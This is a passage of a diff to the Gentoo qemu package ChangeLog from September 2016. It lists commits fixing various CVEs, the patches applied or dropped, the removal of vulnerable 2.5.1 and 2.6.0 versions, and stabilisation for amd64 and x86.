+  b60bdd1f1ee1616b7a9aeeffb4088e1ce2710fb2 ->              , bug #584102
+  1b85898025c4cd95dce673d15e67e60e98e91731 ->              , bug #584146
+  521360267876d3b6518b328051a2e56bca55bef8 -> CVE-2016-4453, bug #584514
+  4e68a0ee17dad7b8d870df0081d4ab2e079016c2 -> CVE-2016-4454, bug #584514
+  a6b3167fa0e825aebb5a7cd8b437b6d41584a196 -> CVE-2016-5126, bug #584630
+  ff589551c8e8e9e95e211b9d8daafb4ed39f1aec -> CVE-2016-5338, bug #584918
+  d3cdc49138c30be1d3c2f83d18f85d9fdee95f1a -> CVE-2016-5238, bug #584918
+  1e7aed70144b4673fc26e73062064b6724795e5f ->              , bug #589924
+  afd9096eb1882f23929f5b5c177898ed231bac66 -> CVE-2016-5403, bug #589928
+  eb700029c7836798046191d62d595363d92c84d4 -> CVE-2016-6835, bug #591244
+  ead315e43ea0c2ca3491209c6c8db8ce3f2bbe05 -> CVE-2016-6834, bug #591374
+  6c352ca9b4ee3e1e286ea9e8434bd8e69ac7d0d8 -> CVE-2016-6833, bug #591380
+  47882fa4975bf0b58dd74474329fdd7154e8f04c -> CVE-2016-6888, bug #591678
+
+  805b5d98c649d26fc44d2d7755a97f18e62b438a
+  56f101ecce0eafd09e2daf1c4eeb1377d6959261
+  fff39a7ad09da07ef490de05c92c91f22f8002f2 ->              , bug #592430
+
+  Package-Manager: portage-2.2.28
+
+  05 Sep 2016; Matthias Maier <tamiko@gentoo.org>
+  +files/qemu-2.7.0-CVE-2016-6836.patch, qemu-2.7.0.ebuild:
+  apply patch for CVE-2016-6836, bug #591242
+
+  Package-Manager: portage-2.2.28
+
+  05 Sep 2016; Matthias Maier <tamiko@gentoo.org> -qemu-2.6.0.ebuild,
+  qemu-2.7.0.ebuild:
+  drop vulnerable 2.6.0
+
+  Package-Manager: portage-2.2.28
+
+  05 Sep 2016; Matthias Maier <tamiko@gentoo.org>
+  -files/qemu-2.5.0-9pfs-segfault.patch,
+  -files/qemu-2.5.0-CVE-2015-8567.patch,
+  -files/qemu-2.5.0-CVE-2015-8613.patch,
+  -files/qemu-2.5.0-CVE-2015-8619.patch,
+  -files/qemu-2.5.0-CVE-2015-8701.patch,
+  -files/qemu-2.5.0-CVE-2015-8743.patch,
+  -files/qemu-2.5.0-CVE-2016-1568.patch,
+  -files/qemu-2.5.0-CVE-2016-1714.patch,
+  -files/qemu-2.5.0-CVE-2016-1922.patch,
+  -files/qemu-2.5.0-CVE-2016-1981.patch,
+  -files/qemu-2.5.0-CVE-2016-2197.patch,
+  -files/qemu-2.5.0-CVE-2016-2392.patch,
+  -files/qemu-2.5.0-ne2000-reg-check.patch,
+  -files/qemu-2.5.0-usb-ehci-oob.patch,
+  -files/qemu-2.5.0-usb-ndis-int-overflow.patch,
+  -files/qemu-2.6.0-crypto-static.patch, -files/qemu-2.6.0-glib-size_t.patch:
+  drop obsolete patches
+
+  Package-Manager: portage-2.2.28
+
+  05 Sep 2016; Matthias Maier <tamiko@gentoo.org> qemu-2.7.0.ebuild:
+  fix installation with USE=python, bug #592908
+
+  Package-Manager: portage-2.2.28
+
+  05 Sep 2016; Agostino Sarubbo <ago@gentoo.org> qemu-2.7.0.ebuild:
+  amd64 stable wrt bug #592430
+
+  Package-Manager: portage-2.2.28
+  RepoMan-Options: --include-arches="amd64"
+  Signed-off-by: Agostino Sarubbo <ago@gentoo.org>
+
+  05 Sep 2016; Agostino Sarubbo <ago@gentoo.org> qemu-2.7.0.ebuild:
+  x86 stable wrt bug #592430
+
+  Package-Manager: portage-2.2.28
+  RepoMan-Options: --include-arches="x86"
+  Signed-off-by: Agostino Sarubbo <ago@gentoo.org>
+
+  05 Sep 2016; Matthias Maier <tamiko@gentoo.org>
+  -files/qemu-2.5.0-CVE-2015-8558.patch,
+  -files/qemu-2.5.0-CVE-2016-2198.patch,
+  -files/qemu-2.5.0-rng-stack-corrupt-0.patch,
+  -files/qemu-2.5.0-rng-stack-corrupt-1.patch,
+  -files/qemu-2.5.0-rng-stack-corrupt-2.patch,
+  -files/qemu-2.5.0-rng-stack-corrupt-3.patch,
+  -files/qemu-2.5.1-CVE-2015-8558.patch,
+  -files/qemu-2.5.1-CVE-2016-4020.patch,
+  -files/qemu-2.5.1-stellaris_enet-overflow.patch,
+  -files/qemu-2.5.1-xfs-linux-headers.patch, -qemu-2.5.1.ebuild:
+  drop vulnerable 2.5.1, bug #592430, and 19 others
+
+  Package-Manager: portage-2.2.28
+
